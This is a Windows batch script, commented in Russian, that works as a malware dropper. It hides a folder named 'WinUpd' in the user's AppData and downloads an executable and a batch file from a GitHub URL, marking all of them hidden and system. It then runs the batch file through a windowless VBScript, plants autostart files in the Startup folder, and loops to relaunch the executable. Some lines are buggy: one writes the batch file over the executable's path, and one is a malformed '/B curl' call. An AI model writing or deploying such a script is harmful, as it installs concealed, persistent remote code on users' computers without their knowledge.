@echo off
setlocal enabledelayedexpansion
rem Основной код

set "folder=%appdata%\WinUpd"
set "upunion=%folder%\Upunion.exe"
set "jossol=%folder%\jossol.bat"
set "vbsfile=%folder%\run_jossol.vbs"
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "autostart_bat=run_script.bat"
set "vbs_script=C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_jossol.vbs"

rem Проверяем, существует ли папка, если нет - создаем её
if not exist "%folder%" (
    echo Folder "%folder%" does not exist. Creating it...
    mkdir "%folder%"
    rem Делаем папку скрытой и системной
    attrib +h +s "%folder%"
)

rem Выводим пути для проверки
echo Folder: "%folder%"
echo Upunion path: "%upunion%"
echo Jossol path: "%jossol%"
echo VBScript path: "%vbsfile%"

rem Проверяем, существует ли файл Upunion.exe, и если нет, скачиваем его
if not exist "%upunion%" (
    echo File "%upunion%" not found. Downloading...
    curl -L -o "%upunion%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/Upunion.exe"
) else (
    echo File "%upunion%" already exists.
)

rem Проверяем, существует ли файл jossol.bat, и если нет, скачиваем его
if not exist "%jossol%" (
    echo File "%jossol%" not found. Downloading...
    curl -L -o "%jossol%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat"
) else (
    echo File "%jossol%" already exists.
)

rem Делаем файлы скрытыми и системными
attrib +h +s "%upunion%"
attrib +h +s "%jossol%"

rem Создаем VBScript для скрытого запуска jossol.bat
echo Set WshShell = CreateObject("WScript.Shell") > "%vbsfile%"
echo WshShell.Run Chr(34) ^& "%jossol%" ^& Chr(34), 0 >> "%vbsfile%"
echo Set WshShell = Nothing >> "%vbsfile%"

rem Добавление VBScript в автозагрузку, чтобы запускать jossol.bat скрытно
echo Adding VBScript to startup...
rem set "regkey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
rem reg add "%regkey%" /v "jossol" /t REG_SZ /d "wscript.exe //B \"%vbsfile%\"" /f
copy "%vbsfile%" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib +s +h "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\run_jossol.vbs"

rem Запуск Upunion.exe
echo Running Upunion.exe...
start "" "%upunion%"

rem Цикл проверки наличия процесса Upunion.exe
:loop
tasklist /FI "IMAGENAME eq Upunion.exe" 2>NUL | findstr /I "Upunion.exe" > NUL
if %ERRORLEVEL% NEQ 0 (
    echo Process Upunion.exe not found. Checking and starting jossol.bat...
    if not exist "%upunion%" (
        echo File "%upunion%" not found. Downloading...
        /B curl -L -o "%upunion%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat"
    ) else (
        echo Starting jossol.bat...
        start "" "%upunion%"
    )
) else (
    echo Process Upunion.exe is running.
)

:: Проверяем и создаем папку автозагрузки если нужно
if not exist "!startup_folder!" (
    mkdir "!startup_folder!"
)

:: Создаем BAT-файл в автозагрузке
(
    echo @echo off
    echo wscript.exe "!vbsfile!"
    echo exit
) > "!startup_folder!\!autostart_bat!"

:: Проверяем создание файла
if exist "!startup_folder!\!autostart_bat!" (
    echo Файл автозагрузки успешно создан: "!startup_folder!\!autostart_bat!"
) else (
    echo Ошибка! Не удалось создать файл автозагрузки
    pause
)

rem Задержка в цикле, чтобы не перегружать систему
timeout /t 10 >nul

rem Возвращаемся в начало цикла
goto loop
